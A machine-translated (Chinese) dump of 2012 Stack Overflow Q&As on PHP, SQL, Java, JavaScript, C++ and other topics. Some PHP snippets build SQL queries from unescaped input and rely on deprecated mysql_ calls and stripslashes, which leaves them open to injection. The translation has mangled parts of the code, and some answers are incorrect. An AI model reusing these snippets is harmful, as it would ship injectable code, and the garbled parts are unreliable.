
var_dump($matches); 
```

要从文件中提取数据，请查看`fgets`逐行读取文件以获取`$row`上述代码中的变量的示例。

然后，您可以使用 INSERT 语句将每一行写入数据库。

需要考虑的一些事项：

文件有多大？您需要多久插入一次此数据 - 是一次性的吗？

这些东西会影响你构建代码的方式；有多种方法可以批量插入数据，如果这只是一次性运行，那么我建议使用`sed`或类似方法操作文本数据，然后使用您选择的数据库的本机方法进行批量插入（对于 mysql，请参阅`LOAD DATA INFILE`，或使用`\.`客户端中的选项）

如果文件很大并且您需要定期插入内容，请查看使用准备好的语句和/或多重插入语法：

```
INSERT INTO mytable (name, number, anothernumber) VALUES('paul', 1, 2),('bob',2,1) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:46:37.927

使用 ph 函数[fgetcsv](http://php.net/manual/en/function.fgetcsv.php)函数读取一个 csv 文件（示例在本页中给出），然后在循环中使用每个函数并使用函数[explode()](http://php.net/manual/en/function.explode.php)解析它并从中创建查询并保存在数据库中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:47:31.507

首先从提取你的价值观开始。如果您的所有数据都像您的示例一样格式化，您可以使用简单的`explode`.

```
$lines = explode(",", $data); // $data should be your file extracted into a string
foreach ($lines as $line) {
    $temp = explode(" ", $line);
    $name = $temp[0];
    $temp_2 = explode("/", $temp[1]);
    $integer_1 = $temp_2[0];
    $integer_2 = $temp_2[1];

    $query = "INSERT INTO table_two_columns SET name = '{$name}', integer_1 = '{$integer_1}', integer_2 = '{$integer_2}'";
} 
```

好吧，这就是我对你的问题的看法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T13:52:28.140

看看[fopen()](http://php.net/manual/en/function.fopen.php)和[fread()](http://php.net/manual/en/function.fread.php)或[fgetcsv()](http://es1.php.net/manual/en/function.fgetcsv.php) php 函数来处理文件，使用它们你应该能够遍历 cvs 文件的行，如果你可以控制你的服务器配置，我会建议您可以改为查看[SplFileObject](http://php.net/manual/en/class.splfileobject.php)，因为您可以更高效/更优雅地处理文件，并且面向对象。但要求您启用 SPL。最后一个是我的建议，因为您可以像这样阅读文件：

```
function random_name(){
            $file_name = "names.csv";
            if(is_readable($file_name)){
                $file = new SplFileObject($file_name);

                $file->seek($file->getSize());
                $linesTotal = $file->key();

                $file->seek(rand(1,$linesTotal-1));
                $line = $file->fgetcsv();

                return $line[4];
            }
        } 
```

这是我的一个示例脚本，用于从 1000 个名称的 cvs 文件中获取随机名称。

当您循环并获取文件信息时，您可以使用[explode()](http://es1.php.net/manual/en/function.explode.php)，此函数通过您定义的分隔符分隔您的字符串，在您的情况下它将是：

```
$array = explode("/", $myLine); 
```

你会像这样访问：

```
$array[0] or $array[1] to get the value 
```

# google-apps-script - 通过追加修改的文件：更改不会显示在我电脑上的谷歌驱动器文件夹中

> ID：13530293
> 
> 赞同：1
> 
> 时间：2012-11-23T13:40:51.460
> 
> 标签：google-apps-script, google-drive-api

使用以下脚本在文件中创建/附加行。在 Google-Online-Environment 中运行良好，我可以查看文件并查看如何附加行。但是，通过我的电脑上的 Google Drive-Folder 查看文件只给了我第一行（在创建期间编写的那个）。其他人只在我的电脑上关闭并重新启动谷歌驱动器后才出现（等待 2 小时）。那么我可以在我的脚本中做什么来做某种“刷新”来查看我的电脑上的变化？

```
function appendFile (textArea) { // run by timer
  var d=new Date();
  var id;
  if ((id=ScriptProperties.getProperty ("fileId"))==null) {
    var f=DocsList.createFile("List", "Started at "+d+"\n");
    ScriptProperties.setProperty ("fileId", f.getId());
  }
  else {
    var f=DocsList.getFileById(id);
    f.append("Appended "+d+"\n");
    if (textArea!=undefined) {
      textArea.setText ("id="+id+"\n"+"name="+f.getName()+"\n"+"date="+d+"\nContents="+f.getContentAsString());
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-22T16:18:27.597

我也遇到过类似的问题，但方向相反。（我正在更新我 PC 上的文件，将其复制到云端硬盘，并希望它同步到云端，以便应用程序脚本可以在其上运行。）我发现我必须删除并重新创建文件才能将其保存到同步。同样的方法在这里似乎也适用。

我已经注释掉了代码的 Ui 部分，替换了日志记录来观察操作，并将其修改为***垃圾，然后在每次更新时重新创建文本文件***。丑陋但有效 - PC 的 GDrive 上的文件会立即更新。

```
function appendFile (/*textArea*/) { // run by timer
  var d=new Date();
  var id;
  if ((id=ScriptProperties.getProperty ("fileId"))==null) {
    var f=DocsList.createFile("List", "Started at "+d+"\n");
    ScriptProperties.setProperty ("fileId", f.getId());
  }
  else {
    var f=DocsList.getFileById(id);
    var text = String.concat(f.getContentAsString(),
               "Appended "+d+"\n");
    f.setTrashed(true);
    f=DocsList.createFile("List",text);
    ScriptProperties.setProperty ("fileId", f.getId());
//    if (textArea!=undefined) {
//      textArea.setText ("id="+id+"\n"+"name="+f.getName()+"\n"+"date="+d+"\nContents="+f.getContentAsString());
//    }
    Logger.log("id="+id+"\n"+"name="+f.getName()+"\n"+"date="+d+"\nContents="+f.getContentAsString());
  }
} 
```

剩下的问题：

*   记住文件的 id 是浪费时间，因为它在每次运行时都会改变。
*   出于同样的原因，您不能依赖监视文本文件。

# java - 常量字符串的串联 VS StringBuffer

> ID：13530294
> 
> 赞同：3
> 
> 时间：2012-11-23T13:41:00.770
> 
> 标签：java, string, concatenation, stringbuffer

你可以给出什么论据来使用更好、更快、更正确的一种或另一种变体。

**第一个变体：**

```
StringBuffer sql = new StringBuffer("SELECT DISTINCT f.ID ")
    .append("FROM FIRST_TABLE F ")
        .append("LEFT JOIN SECOND_TABLE s ON f.ID = s.F_ID ")
    .append("WHERE ")
        .append("F.BOOL = 1 ")
        .append("AND S.DATE IS NOT NULL ")
        .append("AND S.CLOSED = 0 "); 
```

**第二种变体：**

```
String sql = "SELECT DISTINCT f.ID " +
             "FROM FIRST_TABLE F " +
                "LEFT JOIN SECOND_TABLE s ON f.ID = s.F_ID " +
             "WHERE "
                "F.BOOL = 1 " +
                "AND S.DATE IS NOT NULL " +
                "AND S.CLOSED = 0"; 
```

*注：[String](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/String.html)类和[StringBuffer 类](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/StringBuffer.html)。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-23T13:42:09.780

第二个更好：

*   它更清晰（更多的代码与你想要的有关）
*   它更有效，因为所有连接都是在编译时完成的

即使需要执行时连接*（*例如，您在其中有一个变量），编译后的代码也会在需要的地方使用 a `StringBuilder`or `StringBuffer`（取决于您所针对的 Java 版本）。

请注意，如果您正在执行数据库查询，那么效率将是微不足道的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-10T00:05:28.517

您不应该浪费时间担心如何连接几个字符串。使用2并保持清晰。使用 StringBuilder/buffer 并不是一个伟大程序员的标志，如果你是这么想的话。

担心定义模糊的需求和进度落后的事情。

试试这个->

长最终时间1 = 0；{ long initialTimeTest = System.currentTimeMillis(); for(int index = 0; index < 10000; index++){ StringBuilder sb = new StringBuilder("Hello, ").append("World"); System.out.println(sb.toString()); } finalTime1 = System.currentTimeMillis() - initialTimeTest;

}

长最终时间2 = 0；{ long initialTimeTest = System.currentTimeMillis(); for(int index = 0; index < 10000; index++){ String sb = "Hello, " + "World"; System.out.println(某人); finalTime2 = System.currentTimeMillis() - initialTimeTest; }

System.out.println(finalTime1); System.out.println(finalTime2);

结果：

...你好，世界你好，世界 245 148

您认为字符串缓冲区更快吗？

你打破了所有规则之母：保持简单。-

对于普通的字符串处理，没有理由使用 StringBuilder。它只是给平凡的任务增加了不必要的复杂性。

我们需要从大处着眼，考虑模块对项目的整体业务影响。讨论我们是否应该使用 StringBuilder/Builder 或 String 组装一些字符串是很少考虑的， - 不要那样做。

To your question about performance, I recommend:[http://cfd.gmu.edu/~jcebral/academics/csi702/notes/02-optimization.pdf](http://cfd.gmu.edu/~jcebral/academics/csi702/notes/02-optimization.pdf)

# c++ - 使用 drawContours 绘制点序列

> ID：13530297
> 
> 赞同：0
> 
> 时间：2012-11-23T13:41:11.270
> 
> 标签：c++, opencv

**我想用 OpenCV`drawContours`函数绘制自定义的点序列。**

我的代码：

```
std::vector<std::vector<cv::Point> > contours;
std::vector<cv::Point> contour1;
contour1.push_back(cv::Point(100,100));
contour1.push_back(cv::Point(500,500));
contour1.push_back(cv::Point(500,100));
contours.push_back(contour1);
cv::drawContours(testDrawingImage,contours,-1,cv::Scalar(0,0,255),5);
cv::imshow("test",testDrawingImage); 
```

**为什么在这种情况下绘制三角形而不是 L 形？**

当然，我知道我可以用 line 来做到这一点。但也许有人想出了应该如何将它传递给`drawContours`函数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:45:05.300

`drawContours()`完全按照它所说的去做，它绘制了一个由你给它的点包围的轮廓。轮廓是闭合形状的轮廓，因此该`drawContours()`函数将根据您提供的点为您提供闭合形状。

# hibernate - 无法通过排序进行内部连接

> ID：13530306
> 
> 赞同：2
> 
> 时间：2012-11-23T13:41:27.713
> 
> 标签：hibernate

我有以下域模型：

```
class Department {
    Contact primaryContact
    Company company
} 
```

当我执行 JPQL 查询时

```
from Department e 
left join e.primaryContact 
where (e.company.id=?) order by e.name asc 
```

我得到以下 SQL：

```
select *aliases* 
     left outer join contact contact1_ 
     on department0_.contact_id=contact1_.ID 
where 
      department0_.company_id=? 
order by department0_.name desc 
```

但是当我试图执行

```
from Department e 
left join e.primaryContact 
where (e.insuranceCompany.id=?) 
order by e.primaryContact.name asc 
```

我得到：

```
select *aliases* 
  from department department0_ 
       left outer join contact contact1_ on 
       department0_.primary_contact_id = contact1_.ID 
       cross join contact contact2_ 
 where 
         department0_.primary_contact_id = contact2_.ID 
    and department0_.company_id = ? order by contact2_.name desc 
```

不同的是

```
cross join contact contact2_ where department0_.primary_contact_id=contact2_.ID 
```

所以我在排序时总是有内部连接`primaryContact.name`

在这种情况下如何执行左连接？（我使用的是休眠 3.6.10）

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:09:46.113

链式表达式总是导致内部连接。为左连接实体分配别名，并使用别名：

```
from Department e 
left join e.primaryContact contact
where (e.insuranceCompany.id=?) 
order by contact.name asc 
```

# mysql - 按最高总月份分组

> ID：13530313
> 
> 赞同：0
> 
> 时间：2012-11-23T13:41:45.567
> 
> 标签：mysql, rollup

我希望通过模块名称（目前是这样）订购下面的 MySQL 语句，但仅包括在日期范围内包含的所有 module_types 的 COUNT 中排名前 50 的模块。关于我将如何去做的任何想法？IE。如果一个模块的 1 月、2 月、3 月的所有“计数”总数高于另一个模块的相同，则该模块的所有三个月都将高于其他记录。

我试图嵌入一个带有总数的选择，而按此排序似乎需要大量时间。

```
SELECT
  DATE_FORMAT(tbl_client_modules.c_module_month, '%b %y') AS MONTH, 
  tbl_modules.module_name,
  count(tbl_client_modules.c_module_type),
  tbl_client_modules.c_module_type AS MOD_TYPE 
FROM 
  tbl_client_details 
  LEFT OUTER JOIN tbl_client_status ON tbl_client_details.cd_status = tbl_client_status.cl_status_id 
  LEFT OUTER JOIN tbl_client_modules ON tbl_client_details.cd_ZBI_no = tbl_client_modules.cl_module_zbi AND tbl_client_details.cd_UCN = tbl_client_modules.c_module_UCN AND tbl_client_details.cd_co_code = tbl_client_modules.c_module_co_code 
  LEFT OUTER JOIN tbl_modules ON tbl_client_modules.c_module_type = tbl_modules.module_id 
WHERE
  tbl_client_details.cd_removed_date is null
  AND TRIM(tbl_client_details.cd_client_name) <> '' 
  AND (tbl_client_details.cd_region = 'WC')
  AND (tbl_client_modules.c_module_month >= '2012-07-01' AND tbl_client_modules.c_module_month <= '2012-10-30')
  AND tbl_client_modules.c_module_vol > 0 
GROUP BY tbl_client_modules.c_module_month, tbl_client_modules.c_module_type 
ORDER BY tbl_modules.module_name; 
```

索引：

```
tbl_client_details, 0, PRIMARY,        1, cd_id, A, , , , , BTREE, , 
tbl_client_details, 0, PRIMARY,        2, cd_ucn, A, , , , , BTREE, , 
tbl_client_details, 0, PRIMARY,        3, cd_ZBI_no, A, 55351, , , , BTREE, , 
tbl_client_details, 1, cd_ucn,         1, cd_ucn, A, 55351, , , , BTREE, , 
tbl_client_details, 1, cd_opm,         1, cd_OPM, A, 321, , , YES, BTREE, , 
tbl_client_details, 1, cd_zbi_no,      1, cd_ZBI_no, A, 55351, , , , BTREE, , 
tbl_client_details, 1, cd_cpe_rm_code, 1, cd_cpe_rm_code, A, 1729, , , YES, BTREE, , 
tbl_client_details, 1, cd_sic_code,    1, cd_sic_code, A, 802, , , YES, BTREE, , 
tbl_client_details, 1, cd_enrol_date,  1, cd_enrol_date, A, 13837, , , YES, BTREE, , 
tbl_client_details, 1, cd_co_code,     1, cd_co_code, A, 8, , , YES, BTREE, , 
tbl_client_details, 1, cd_client_name, 1, cd_client_name, A, 55351, , , YES, BTREE, , 
tbl_client_details, 1, cd_segment,     1, cd_segment, A, 36, , , , BTREE, , 
tbl_client_details, 1, cd_region,      1, cd_region, A, 18, , , YES, BTREE, , 
tbl_client_details, 1, cd_status,      1, cd_status, A, 295, , , YES, BTREE, ,  

tbl_client_status,  0, PRIMARY,        1, cl_status_id, A, 32, , , , BTREE, , 
tbl_client_status,  1, cl_status_id,   1, cl_status_id, A, 32, , , , BTREE, , 

tbl_client_modules, 0, PRIMARY,          1, cl_module_id, A, 12135739, , , , BTREE, , 
tbl_client_modules, 1, cl_module_zbi,    1, cl_module_zbi, A, 53697, , , , BTREE, , 
tbl_client_modules, 1, c_module_type,    1, c_module_type, A, 104, , , , BTREE, , 
tbl_client_modules, 1, c_module_month,   1, c_module_month, A, 27, , , YES, BTREE, , 
tbl_client_modules, 1, c_module_ucn,     1, c_module_ucn, A, 63872, , , YES, BTREE, , 
tbl_client_modules, 1, c_module_co_code, 1, c_module_co_code, A, 9, , , YES, BTREE, , 
tbl_client_modules, 1, c_module_vol,     1, c_module_vol, A, 32020, , , YES, BTREE, , 

tbl_modules,        0, PRIMARY,        1, module_id, A, 109, , , , BTREE, , 
tbl_modules,        1, module_id,      1, module_id, A, 109, , , , BTREE, , 
tbl_modules,        1, module_tab,     1, module_tab, A, 9, , , YES, BTREE, , 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T10:14:06.500

我发现“WITH ROLLUP”功能正在做我需要的事情。下一个问题是找到一种对此进行排序的方法。在其中工作，这里有一个挑战的答案：[对组中的“汇总”进行排序](https://stackoverflow.com/questions/1768547/sort-the-rollup-in-group-by)

# c# - 在字符串c#中写入XML

> ID：13530314
> 
> 赞同：-1
> 
> 时间：2012-11-23T13:41:45.453
> 
> 标签：c#, xml, string

我想知道当我得到 xml 时我怎么能把它写成一个字符串？

因为当我这样做时：

```
{
     XDocument xdoc = XDocument.Load("MYURL");
     string textresult = xdoc.Root.ToString();
     Label_RequestResult.Text = textresult;
} 
```

我的 Label_RequestResult.text 将等于 XML 节点的值。

我想实际返回整个 xml 结构。

这可能吗？

感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:44:36.457

我认为应该是这样的：你试过了吗？

```
string textresult = xdoc.Root.Value(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:58:00.720

就我而言`string textresult = xdoc.ToString();`，完成了这项工作。我得到了整个结构，即使有空格和换行符。

# .htaccess - .htaccess RewriteRule 表现得很奇怪

> ID：13530316
> 
> 赞同：1
> 
> 时间：2012-11-23T13:41:47.967
> 
> 标签：.htaccess, mod-rewrite

我有一个网页，其网址如下所示：

[http://www.mydomain.com/folder/index.php?title=The_title](http://www.mydomain.com/folder/index.php?title=The_title)

唯一的问题是我希望它看起来像其中之一：

[http://www.mydomain.com/folder/The_title](http://www.mydomain.com/folder/The_title)

[http://www.mydomain.com/folder/The_title.php](http://www.mydomain.com/folder/The_title.php)

我进行了很多搜索，找到了一种“有效”的解决方案：

```
RewriteEngine on
RewriteRule ^([^/]*)\.html$ /folder/index.php?title=$1 [L] 
```

它做了它应该做的，除了结尾必须是“.html”（或“.kl”，如果你喜欢的话）。此解决方案不接受“.php”，这给了我一个“500 内部服务器错误”。如果我在没有扩展名的情况下尝试它，也会发生同样的事情。

**编辑：** 忘了提到 .htaccess 文件位于文件夹而不是根目录中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T17:24:02.203

这对你有用。

```
RewriteEngine On
RewriteRule ^folder/([^/]*)\.php$ /folder/index.php?title=$1 [L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T20:32:53.347

所以，由于我无法让它正常工作，我接受了挑战并开始阅读有关 mod_rewrite 的内容，这导致了解决方案：

```
RewriteRule ^(\w+)/?$ index.php?title=$1 [L] 
```

如果其他人遇到麻烦，我会推荐这些网站：
[更多 .htaccess 提示和技巧..](http://corz.org/serv/tricks/htaccess2.php)
[Apache mod_rewrite 深度指南](http://net.tutsplus.com/tutorials/other/a-deeper-look-at-mod_rewrite-for-apache/)

# jquery - IE 尝试从 EE 和 jQuery Form Plugin 下载 json 响应

> ID：13530320
> 
> 赞同：2
> 
> 时间：2012-11-23T13:41:53.887
> 
> 标签：jquery, json, internet-explorer, expressionengine

我在 EE 中使用安全破解器表单通过前端上传条目，并且我正在使用 jQuery 表单插件。

问题是 IE 尝试下载 json 响应。我知道这是一个已经提出了相当多的问题，我已经四处寻找可行的解决方案，但他们都没有使用 EE 和 jQuery Form Plugin。

这是ajax js：

```
$('#publishForm').ajaxForm({
    dataType: 'json',
    beforeSubmit: function() { 
        // Photo input validation
        var photo = $('#publishForm input[type="file"]').val();
        if( photo == null || photo == '' ) {
            $('#publishForm #photo_error').show();            
            return false;
        }
    },
    success: function(data) {
        if (data.success) {
            console.log('You successfully added a new entry with entry_id ' + data.entry_id);
        }
        else {
            console.log('Failed with the following errors: ' + data.errors.join(', '));

        }
    }
}); 
```

我不知道我是否需要输入另一个参数来修复它或做一些 hacky 修复。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:49:52.347

您响应的响应标头的内容类型/mime-type 是什么？是吗

`content-type: application/json`

这似乎是一个 IE 错误，如果您使用的是字母大小写标题设置，例如

`Content-Type: application/json`

IE 客户端下载响应。

示例响应标头：

```
 HTTP/1.1 200 OK
    Date: Fri, 23 Nov 2012 19:08:26 GMT
    content-type: application/json
    Access-Control-Allow-Origin: *
    Access-Control-Request-Method: POST, GET, OPTIONS
    Cache-Control: o-cache
    Expires: -1
    Access-Control-Request-Headers: X-PINGOTHER
    Connection: close 
```

# javascript - Javascript 从 1 个对象创建 2 个实例

> ID：13530327
> 
> 赞同：2
> 
> 时间：2012-11-23T13:42:11.940
> 
> 标签：javascript, object, javascript-objects

我有两个 DIV 容器，每个容器都包含一个谜题（使用 jquery 可拖动实现）。

我还得到了一个对象，它看起来像：

```
var puzzle var puzzle = {
    option1 = [],
    init:function(container) { .... }
} 
```

要开始我使用的一个 DIV 的拼图：

```
// left puzzle div
var puzzleLeft = puzzle;
puzzleLeft.init(leftContainer);

// right puzzle div
var puzzleRight = puzzle;
puzzleRight.init(leftContainer); 
```

但是对于左边的它不起作用。我要做的一切都发生在右边：/当我取消注释右边的起始代码时，它将适用于左边:) 似乎右边的起始代码是错误的？这是创建 2 个拼图实例的错误方法吗？

谢谢马特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:01:19.253

## 原型继承

您的标题是**“从 1 个对象创建 2 个实例”**。上面写着原型继承。

您可以使用`Object.create`创建从另一个对象继承的对象。

```
// left puzzle div
var puzzleLeft = Object.create(puzzle);
puzzleLeft.init(leftContainer);

// right puzzle div
var puzzleRight = Object.create(puzzle);
puzzleRight.init(leftContainer); 
```

但是，任何引用对象的属性都需要在您的`init`函数中设置。像这样的东西：

```
var puzzle = {

    // Let it be null for now
    option1: null,

    init: function(container) {
        // Set it to empty array inside init
        this.option1 = [ ];
    }

}; 
```

这将确保`puzzleLeft`并且`puzzleRight`正在使用不同的数组。

* * *

## 克隆

如果您使用像 jQuery 这样的库，另一种选择是简单地克隆对象。

```
// left puzzle div
var puzzleLeft = $.extend({ }, puzzle);
puzzleLeft.init(leftContainer);

// right puzzle div
var puzzleRight = $extend({ }, puzzle);
puzzleRight.init(leftContainer); 
```

使用`$.extend({ }, someObject)`将制作`someObject`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:44:43.740

您可以创建类的构造函数而不是对象：

```
function Puzzle(){
   var self = this;

   self.option1 = [];
   self.init = function(container) { .... };
} 
```

并创建它的两个实例：

```
// left puzzle div
var puzzleLeft = new Puzzle();
puzzleLeft.init(leftContainer);

// right puzzle div
var puzzleRight = new Puzzle();
puzzleRight.init(rightContainer); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:47:28.030

实际上`puzzleLeft`和`puzzleRight`是相同的对象`puzzle`。

您可以将拼图创建为

```
function puzzle(){
...
} 
```

并使用

```
new Puzzle() 
```

或者使用 jquery 的 clone 函数来创建具有不同引用的对象的副本

# sql - 如何在大数据库中获得第一个结果（带排序）

> ID：13530328
> 
> 赞同：1
> 
> 时间：2012-11-23T13:42:12.693
> 
> 标签：sql, postgresql, sql-order-by, limit, plpgsql

我有一张有 1100 万条记录的大桌子。我想要一张唱片。

```
SELECT * 
FROM "PRD".events_log 
WHERE plc_time < '2012-11-19 14:00' 
  AND ((event_type_id IN (1,51) 
       AND machine_id = 1 
       AND island_id = 88) 
   OR (event_type_id IN (2000,2001) 
       AND machine_id=88)) 
ORDER BY plc_time desc 
LIMIT 1 
```

订购此查询的成本很高，因为我不限制双方的 plc_time。我不能限制这个，所以我可以加快这个速度吗？

我有重要字段的索引，所以缺少它不是问题。

此查询是函数 pl/pgsql 中的其他几个查询之一。

我听说过一些关于光标的东西，但我不知道如何使用它。

这是解释分析这个查询：

```
“限制（成本=4719.97..4719.97 行=1 宽度=850）（实际时间=6074.900..6074.901 行=1 循环=1）”
“ -> 排序（成本=4719.97..4720.49 行=208 宽度=850）（实际时间=6074.897..6074.897 行=1 循环=1）”
“排序键：plc_time”
“排序方法：top-N heapsort 内存：17kB”
“ -> events_log 上的位图堆扫描（成本=50.07..4718.93 行=208 宽度=850）（实际时间=248.306..6068.046 行=6911 循环=1）”
" 重新检查条件：(((machine_id = 1) AND (event_type_id = ANY ('{1,51}'::integer[]))) OR ((machine_id = 88) AND (event_type_id = ANY ('{2000,2001 }'：：整数[]））））”
“过滤器：（（plc_time BitmapOr（成本=50.07..50.07 行=1246 宽度=0）（实际时间=244.710..244.710 行=0 循环=1）”
“ -> fki_events_type_fk 上的位图索引扫描（成本=0.00..24.98 行=623 宽度=0）（实际时间=238.529..238.529 行=832699 循环=1）”
" 索引条件：((machine_id = 1) AND (event_type_id = ANY ('{1,51}'::integer[])))"
“ -> fki_events_type_fk 上的位图索引扫描（成本=0.00..24.98 行=623 宽度=0）（实际时间=6.177..6.177 行=6869 循环=1）”
“索引条件：((machine_id = 88) AND (event_type_id = ANY ('{2000,2001}'::integer[])))”
“总运行时间：6075.175 毫秒”
```

并分析表：

```
INFORMACJA: analizowanie "PRD.events_log"
INFORMACJA：“events_log”：przeskanowano 30000 z 158056 stron，zawierających 2369701 żywych wierszy i 71270 martwych wierszy；30000 wierszy w przykładzie, 12488167 szacowanych wszystkich wierszy
Zapytanie zostało wykonane w 52203 ms i nie zwróciło żadnych wyników。

快速翻译：
从 158056 页中扫描了 3000 个，包含：
2369701 活行和 71270 死行。
例如 30000 行，12488167 估计所有行

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T07:55:33.420

只是查看查询的一个想法：如果您为 event_type 的选择创建一个子查询怎么办？我可以想象排序花费的时间最多，并且在使用子查询时可能会减少必须处理的数据：

```
select * from "prd".events_log where plc_time < '2012-11-19 14:00' and id in (
 select e.id from "prd".events_log e where (e.event_type_id IN (1,51) etc...
   AND machine_id=88))) ORDER BY plc_time desc LIMIT 1; 
```

另一种解决方案可能是使用另一个子查询最小化内存中的数据：

```
select * from "prd".events_log where id in (select e.id from etc..); 
```

整个想法是您只在需要时才要求行的其余部分。

带有光标的代码如下所示：

```
create or replace function use_lock returns int as $$
declare
 cur refcursor;
 rec RECORD;
begin
 open cur for select .... ;
 loop
  fetch cur into rec;
  exit when not found;
  ..business logic working on the record.
 end loop;
 close cur;
END;
$$ LANGUAGE PLPGSQL STABLE; 
```

希望这可以帮助，

洛克

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:59:21.930

尝试在`plc_time`. 它将加快查询速度。

如果没有索引，`plc_time`它将始终对表进行全面扫描，因为`ORDER BY plc_time`.

UPD：试试这张`ANALYZE`桌子。详细信息在这里[http://www.postgresql.org/docs/current/static/sql-analyze.html](http://www.postgresql.org/docs/current/static/sql-analyze.html)。

# c++ - 构造函数抛出异常的对象的异常处理是否可以接近其基于堆栈的代码创建？

> ID：13530330
> 
> 赞同：0
> 
> 时间：2012-11-23T13:42:22.123
> 
> 标签：c++, exception-handling

我正在尝试使我的 C++ 代码异常安全，但遇到了一个问题，无论是询问朋友还是搜索网络都无济于事。

据我了解，当使用构造函数创建对象时可能会引发异常，创建代码需要用`try`块括起来，异常处理在`catch(){}`.

如果创建是基于堆的（例如`new`，使用默认分配器编辑），我可以将异常处理代码放置在创建附近，如下所示：

```
void f() {
  // work unrelated to Hoge object here

  try {
    Hoge *pHoge = new Hoge(); // could throw an exception
  } catch(HogeException& ex) {
    // handle exception
  }

  // rest of work here
} 
```

但是，如果创建是基于堆栈的，由于块的范围，我找不到这样做的方法并求助于下面的代码`try`：

```
void g() {
  // work unrelated to Hoge object here

  try {
    Hoge hoge; // could throw an exception

    // rest of work here
  } catch(HogeException& ex) {
    // handle exception
  }
} 
```

如果`// rest of work`上面的代码很大，对象创建和异常处理之间的位置距离可能会很长，从而降低代码的可读性......

我更喜欢异常处理代码靠近对象创建（也许这是结构的概念之一`try`）`catch`。有什么解决办法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T13:49:27.043

将 委托`// rest of work`给辅助函数，并将 a 传递`Hoge&`给该函数：

```
void RestOfWork(Hoge& hoge)
{
  // rest of work here
}

void g() {
  // work unrelated to Hoge object here

  try {
    Hoge hoge;
    RestOfWork(hoge);
    // rest of work here
  } catch(HogeException& ex) {
    // handle exception
  }
} 
```

顺便说一句，`Hoge hoge();`不做你认为它做的事。您可能认为您正在声明一个名为`hoge`type的对象`Hoge`，并通过调用默认构造函数对其进行初始化。你实际上在做的是声明一个名为的函数`hoge`，它不带参数并返回一个`Hoge`值。我已经在上面的代码中解决了这个问题。

**编辑**确实，正如@LightnessRacesInOrbit 所建议的那样，`Hoge`对象的构造也可以在延迟函数中进行，例如：

```
 void RestOfWork()
  {
       Hoge hoge;
      // rest of work here
  }

  void g() {
    // work unrelated to Hoge object here

    try {
      RestOfWork();
    } catch(HogeException& ex) {
      // handle exception
    }
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:29:18.053

一种合理的方法是使用可为空的单项容器，例如`boost::optional`：

```
void g() {
  // work unrelated to Hoge object here

  boost::optional<Hoge> opt_hoge;
  try {
    opt_hoge = boost::in_place<Hoge>();
  } catch(HogeException& ex) {
    // handle exception
  }
  Hoge &hoge = *opt_hoge;

  // rest of work here
} 
```

如果您不能使用 Boost，`std::unique_ptr`则会以堆分配为代价：

```
void g() {
  // work unrelated to Hoge object here

  std::unique_ptr<Hoge> opt_hoge;
  try {
    opt_hoge = std::unique_ptr<Hoge>(new Hoge);
  } catch(HogeException& ex) {
    // handle exception
  }
  Hoge &hoge = *opt_hoge;

  // rest of work here
} 
```

# python - Python：比较两次，并在几分钟内返回

> ID：13530338
> 
> 赞同：1
> 
> 时间：2012-11-23T13:42:48.023
> 
> 标签：python, string, class, date, time

我有一个需要两个字符串（时间）的方法，例如`15:01` 该方法应该占用时间并`time1-time2`在几分钟内返回一个新时间。例如。`15:53 - 15:59`应该给我`6 minutes`，但是我被卡住了。

这是我的代码：

```
import datetime 
class timeCalc(object):
    def timeDiff(self,time1,time2):
        timeA = datetime.datetime.strptime(time1, "%H:%M")
        timeB = datetime.datetime.strptime(time2, "%H:%M")
        newTime = timeA - timeB 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T13:51:24.567

您的功能需要`return` `newTime`：

```
import datetime

def timeDiff(time1,time2):
    timeA = datetime.datetime.strptime(time1, "%H:%M")
    timeB = datetime.datetime.strptime(time2, "%H:%M")
    newTime = timeA - timeB
    return newTime.seconds/60   

print timeDiff('15:59','15:53'), 'minutes'

>>> 6 minutes 
```

笔记：

我想你想要`newTime = timeB - timeA`否则你必须像我一样*倒退时间。*

# php - 折旧的 PHP 函数。新版本是什么？

> ID：13530341
> 
> 赞同：0
> 
> 时间：2012-11-23T13:42:53.703
> 
> 标签：php, login, deprecated

> **可能重复：**
> [PHP 替代 session_is_registered](https://stackoverflow.com/questions/2600905/php-alternative-to-session-is-registered)

许多人可能会使用 PHP MySQL 函数作为网站的登录部分

我正在尝试使用此代码；

**在每个内容页面上 - 检查是否登录**

```
<?php
session_start();
if( isset($_SESSION[$myusername]) ){
header("location:main_login.php");
}
?> 
```

**检查登录脚本**

```
<?php

$host="**"; // Host name 
$username="**"; // Mysql username 
$password="**"; // Mysql password 
$db_name="ClubEvents"; // Database name 
$tbl_name="members"; // Table name 

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
mysql_select_db("$db_name")or die("cannot select DB");

// username and password sent from form 
$myusername=$_POST['myusername']; 
$mypassword=$_POST['mypassword']; 

// To protect MySQL injection (more detail about MySQL injection)
$myusername = stripslashes($myusername);
